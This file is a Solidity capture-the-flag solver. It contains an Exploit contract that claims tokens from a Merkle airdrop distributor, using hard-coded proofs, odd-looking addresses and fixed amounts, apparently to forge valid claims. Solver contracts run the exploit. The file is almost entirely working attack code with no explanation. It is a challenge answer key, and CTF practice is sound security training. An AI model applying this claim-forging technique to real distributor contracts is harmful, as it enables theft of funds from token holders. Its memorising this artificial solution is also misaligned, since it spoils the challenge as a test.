// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";
import "@uniswap/merkle-distributor/contracts/interfaces/IMerkleDistributor.sol";

import "src/Challenge.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        uint256[15] memory proofStatic = [
            0xf4b4a7b805786d5102775d9ee8b75e4170be5f95560fbaa6bfa8d0a88670211c,
            0x13570a0e1203756449153aecb37e73e7571f1a31891f1a54f83fa1a349cfeff8,
            0x92da3364182e56d21458ff875e1e50608c44e0d6fd3e818d7fcf8784d7574a76,
            0x264633b7c0617ccdc76e0d020827c8aefd8e033393917ab8ed7f6caacb2c6d2a,
            0xdacfaa72bd66cf0308cdf5efe4431db0fdd2e9111940bebb919dd58abbe2e974,
            0x92b4aac3d8d3ee10c7c6789959d299ead0b81db064cde5e320181bbf469ae783,
            0x844aa3db62bcf0397a407e3108852a7aa8d3aa9bcc13abe64fa7cc3429b90590,
            0xdc38e1967a43a604004ecdc34310290a456e57184b006a22687ab558e02104bd,
            0x8fab5b3020e855678559a5b89b316fc543d341b7ebf22596b090400a074b68bc,
            0xa41d64aae32e2a0a4090e338ce13df8ea99863cbfeb89b564ff62b28e2e16528,
            0x3510ac803bb65c05bee72186e79e6f2e14435c428ac4b3b5492b9cb3e5f471b9,
            0xe02b610290633561c80911519f1c5fbb4b51c6fac3b1e6660a1492e6a5e53d1e,
            0x0904e37f6dbc9c845b7ecf25382473f72b8006f6074320d13874a3fec39f4955,
            0x7878691a31f3c88b3e0792a8e282a5ff2dc131a223f456cd8177b5933f525e24,
            0x3144d8f63ed97ea9e6975cdd90dcded192e6989765e17f5f7b24002364cba6c6
        ];

        bytes32[] memory proof = new bytes32[](proofStatic.length);
        for (uint256 i = 0; i < proofStatic.length; i++) {
            proof[i] = bytes32(proofStatic[i]);
        }

        IMerkleDistributor(CHALLENGE.MERKLE_DISTRIBUTOR()).claim(
            0, 0x000000000000001d48ffBD0C0DA7c129137A9C55, 0x2cf0afa3c50ed40000, proof
        );
    }

    function exploit1() external {
        uint256[18] memory proofStatic = [
            0x7eab1c8ea3c16482debca76fcaca39b88e54e123762b05ef9900cdd9ec74fbff,
            0x6a32826184fa97afa312bd55092828bc9ed41ec9f1223c9a03a5414ca6fdec05,
            0x1261f8c1bfe37a3078016d0d5c29258bcea4db3daa6794fa36cbeabae9185e95,
            0x9135ef27f20d47ca12d6d7890de2129cd1120dc98e34f8dc3dc947ef64ecb738,
            0x2bb2cdc203dced825593c2252de9652dd84b03885a9ffb574aae82b8689e0bd9,
            0x5ad04c995903aad64233d346c773dd043446aa8f6a3ff57e2ec1497e7e183c88,
            0xada1375f2d9a23ac84518bbf2e6d08de3bebec557faddfb402f78bf0c2e0fc26,
            0x1d98b5ebf00ce1b8ffa8129d2874503400dfbdc40bcd5862933c86b727008cb1,
            0xe09e4562cf542ca2f17d5633f49aa83871ef45276bf71be0cb0443b09eb822c0,
            0x4b6e8beff7608bbd9a15b58703451828cf3c2887d64e287e6f10f4189d307c37,
            0xa8cfc652184c4995fe84d365d0e4bcf64584719edcac307673850237fae37d23,
            0x0ab6daf9c73300a7fd677f43c16df81a233a66ce4ac220f838491c8eab388c53,
            0x25fcd08de61d6ce3245a44e604616f6a25865c9052e11c728d74a22a5b51ae1b,
            0x6a4bf93f3ec87e8743d7f0f5a963d5f58fad39764f19fd18b546fa4200ef26d4,
            0x7ce9419ef2b43ea2ac4915ec791541d12431868ee962f5a5cec6828a4273af48,
            0x0d29c1dab07a1d650eb0c295cb4d480e5c754697a153a399dc4e5de0a5e4fda7,
            0x509df4e3afb648742820da647cbe89a8c9d5d8f69f56e1d9cc7e964c4b497400,
            0xc61672b51620329157c09e93120384c7e539511991bb6ef9fc37f570f220f2f9
        ];

        bytes32[] memory proof = new bytes32[](proofStatic.length);
        for (uint256 i = 0; i < proofStatic.length; i++) {
            proof[i] = bytes32(proofStatic[i]);
        }

        IMerkleDistributor(CHALLENGE.MERKLE_DISTRIBUTOR()).claim(
            1, 0x000000000000006F6502B7F2bbaC8C30A3f67E9a, 0x2b5e3af16b18800000, proof
        );
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit();
    }
}

contract Solve1 is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit1();
    }
}
